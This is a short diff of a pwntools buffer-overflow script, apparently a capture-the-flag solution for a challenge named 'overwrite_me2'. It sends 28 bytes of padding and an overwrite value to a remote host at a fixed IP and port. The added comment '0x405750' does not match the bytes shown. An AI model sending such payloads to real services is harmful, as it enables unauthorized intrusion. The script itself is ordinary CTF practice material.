@@ -1,8 +1,8 @@
 from pwn import *
 
 def conn():
-    # r = process("./overwrite_me2")
-    # gdb.attach(r)
+    #r = process("./overwrite_me2")
+    #gdb.attach(r)
 
     r = remote("13.48.160.64", 1002)
 
@@ -12,8 +12,8 @@ def conn():
 def main():
     r = conn()
 
-    buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
-    value = "\x50\x57\x4e"
+    buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGG" # 28 bytes
+    value = "\x50\x57\x4e" # 0x405750
     payload = buffer + value
 
     r.recvuntil(b"your payload:")
